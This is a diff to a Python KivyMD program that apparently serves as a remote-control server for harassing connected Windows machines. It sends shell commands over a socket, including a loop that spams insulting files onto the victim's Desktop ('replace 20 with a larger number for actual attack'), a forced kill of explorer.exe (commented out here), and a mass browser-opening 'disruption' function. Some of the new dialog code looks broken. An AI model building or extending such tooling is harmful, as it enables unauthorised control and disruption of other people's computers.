@@ -2,11 +2,16 @@ import os
 import socket
 import threading
 import sys
+from functools import partial
+
 import kivy
 import kivymd
 from kivymd.app import MDApp
 from kivy.lang import Builder
 from kivymd.uix.screen import Screen
+from kivymd.uix.dialog import MDDialog
+from kivy.uix.boxlayout import BoxLayout
+from kivymd.uix.button import MDFlatButton
 
 KV = '''
 ScreenManager:
@@ -118,7 +123,7 @@ ScreenManager:
                 OneLineListItem:
                     id: openBrowser
                     text: "Open Browsers"
-                    on_press: app.OpenBrowser()
+                    on_press: app.OpenBrowsers()
 
         MDTextField:
             id: consoleField
@@ -131,6 +136,15 @@ ScreenManager:
             pos_hint: {"center_x": .95, "center_y": .1} 
             elevation_normal: 12
             on_press: app.MainMenu()
+
+<TaskKillContent>
+    orientation: 'vertical'
+    spacing: '12dp'
+    size_hint_y: None
+    height: '120dp'
+
+    MDTextField:
+        hint_text: 'Enter Process Name'
         
 '''
 
@@ -267,6 +281,7 @@ class Main(MDApp):
 
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
+            
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -412,7 +427,7 @@ class Main(MDApp):
 
     # Juls Severe Disruption
     # Open many browsers
-    def OpenBrowser(self):
+    def OpenBrowsers(self):
         while True:
             # Reset console
             self.root.ids.consoleField.text = ''
@@ -429,7 +444,7 @@ class Main(MDApp):
         while True:
             # Reset console
             self.root.ids.consoleField.text = ''
-            # replace 20 with a larger number for actual attack
+            # Replace 20 with a larger number for actual attack
             command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
@@ -456,13 +471,29 @@ class Main(MDApp):
             # Reset console
             self.root.ids.consoleField.text = ''
 
+            self.killTaskDialog = MDDialog()            
+            tkCancelBtn = MDFlatButton(text = "CANCEL", on_press = self.killTaskDialog.close())
+            self.root.ids['tkCancel'] = tkCancelBtn
+            
+            tkAcceptBtn = MDFlatButton(Text = "OK")
+            self.root.ids['tkAccept'] = tkAcceptBtn
+            
+            self.killTaskDialog = MDDialog(
+                title = "Task Kill:",
+                type = "custom",
+                content_cls = TaskKillContent(),
+                buttons = [tkCancelBtn, tkAcceptBtn,],)
+            self.killTaskDialog.open()
+
+            #self.root.ids.tkCancelBtn.on_press = partial(self.killTaskDialog.close())
+            
             # procname = input('Enter Process Name: ')
-            command = 'taskkill /im explorer.exe /F'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            output = self.currConn.recv(8096).decode()
-            print('Output: ', output)
-            self.root.ids.consoleField.text = output
+##            command = 'taskkill /im explorer.exe /F'
+##            self.currConn.send(command.encode())
+##            print('Command sent to client: ', command)
+##            output = self.currConn.recv(8096).decode()
+##            print('Output: ', output)
+##            self.root.ids.consoleField.text = output
             break
 
     def DisruptionMenu(self):
@@ -471,6 +502,9 @@ class Main(MDApp):
     def MainMenu(self):
         self.root.current = "mainMenu"
 
+
+class TaskKillContent(BoxLayout):
+    pass
 
 if __name__ == '__main__':
     Main().run()
